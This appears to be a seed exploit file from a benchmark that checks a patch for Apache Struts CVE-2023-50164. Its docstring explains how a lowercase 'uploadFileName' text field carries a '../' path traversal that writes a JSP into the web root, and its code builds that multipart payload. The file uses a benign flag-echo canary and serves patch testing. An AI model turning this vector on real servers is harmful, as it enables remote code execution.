#!/usr/bin/env python3
"""[GIVEN] CVE-2023-50164 (S2-066) seed exploit for struts-fileupload-interceptor-path-traversal-rce.

Struts single-file upload: the legacy FileUploadInterceptor binds the multipart file to the action
property `upload` and its name to `<inputName>FileName`. The classic S2-066 vector smuggles a
*second*, BARE case-variant of the filename parameter as a normal text field:

    file  part : name="Upload";  filename="data.txt"      (body = benign flag-echo JSP)
    text  part : name="uploadFileName"                    value = "../pcb_orig_<nonce>.jsp"

Naming the file field `Upload` (capital 'U') makes the interceptor set its own safe key as
`UploadFileName` (= "data.txt", path-stripped by getCanonicalName). The attacker's text param is
the bare property `uploadFileName` (lowercase 'u'), which:
  - is a DISTINCT map key from `UploadFileName` under the case-SENSITIVE HttpParameters of V0, and
  - binds to the action's setUploadFileName(...) via OGNL (OGNL only case-folds the FIRST char, so
    the bare `uploadFileName`/`UploadFileName` both resolve to setUploadFileName -- but an
    all-lowercase `uploadfilename` would NOT), and
  - sorts AFTER `UploadFileName` (0x75 > 0x55) under the natural-order ParametersInterceptor, so it
    is applied LAST and wins; being a text param it is not run through getCanonicalName, so `../`
    survives.

On V0 (6.3.0) HttpParameters is CASE-SENSITIVE and appendAll() does NOT dedupe, so the bare
`uploadFileName` traversal coexists with `UploadFileName`, wins, and writes the JSP to the web root
-> GET /pcb_orig_<nonce>.jsp echoes ${PCB_FLAG} (REACHES).

On V1 (6.3.0.2, S2-066 patched) appendAll() first removes every key that equalsIgnoreCase the
interceptor's own keys -- `uploadFileName`.equalsIgnoreCase("UploadFileName") is TRUE -> the
attacker's bare case-variant is WIPED, the file is saved under /uploads/ with its benign name ->
GET returns 404 (BLOCKED). This bare-case-variant dedup is exactly the S2-066 fix.

BENIGN CANARY: the uploaded JSP only echoes System.getenv("PCB_FLAG"); no webshell / exec.
"""


def candidate(nonce: str) -> dict:
    return {
        "id": "cve-2023-50164-casevariant-uploadFileName",
        # capital-initial file field -> interceptor's safe key `UploadFileName` sorts before the
        # bare lowercase-initial `uploadFileName` attacker param:
        "file_field": "Upload",
        "file_filename": "data.txt",
        # BARE case-variant of the filename param (case-equal to the interceptor key -> removed by
        # the S2-066 case-insensitive appendAll dedup on V1):
        "text_fields": [["uploadFileName", "../pcb_orig_%s.jsp" % nonce]],
        "target_jsp": "/pcb_orig_%s.jsp" % nonce,
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate("demo"), indent=2))
